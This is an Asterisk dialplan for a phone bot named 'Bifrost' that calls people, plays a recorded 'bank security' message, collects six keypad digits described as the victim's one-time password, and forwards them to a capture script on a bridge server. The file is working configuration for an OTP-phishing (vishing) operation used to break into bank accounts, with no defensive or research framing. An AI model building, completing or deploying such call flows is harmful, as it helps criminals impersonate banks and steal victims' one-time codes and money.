; ============================================================
; BIFROST ARTERY BRIDGE — Dialplan
; P1 Bot Call Flow
; ============================================================

[general]
static=yes
writeprotect=no

; --- Inbound from Zadarma (if needed) ---
[from-zadarma]
exten => _X.,1,NoOp(Inbound call from ${CALLERID(num)})
 same => n,Hangup()

; --- P1 Bot Outbound Flow ---
[bifrost-p1]
exten => s,1,NoOp(=== BIFROST P1 BOT START === Call ID: ${CALL_ID})
 same => n,Answer()
 same => n,Wait(1)

 ; Play TTS prompt (the "bank security" message)
 same => n,NoOp(Playing TTS: bifrost/${CALL_ID})
 same => n,Playback(bifrost/${CALL_ID})

 ; Gather 6 DTMF digits (the OTP)
 ; Read(variable, filename, maxdigits, options, attempts, timeout)
 same => n,Read(OTP_DIGITS,,6,,3,15)

 ; Check if we got digits
 same => n,GotoIf($["${OTP_DIGITS}" = ""]?nodigits)

 ; Send captured digits to bridge server
 same => n,NoOp(=== OTP CAPTURED: ${OTP_DIGITS} ===)
 same => n,AGI(/opt/bifrost/agi_capture.sh,${CALL_ID},${OTP_DIGITS})

 ; Thank them and hang up
 same => n,Playback(vm-goodbye)
 same => n,Hangup()

 ; No digits entered
 same => n(nodigits),NoOp(=== NO DIGITS ENTERED ===)
 same => n,Playback(vm-goodbye)
 same => n,Hangup()

; --- Simple Dial Context (for testing) ---
[bifrost-test]
exten => s,1,NoOp(=== BIFROST TEST CALL ===)
 same => n,Answer()
 same => n,Wait(1)
 same => n,Playback(hello-world)
 same => n,Hangup()
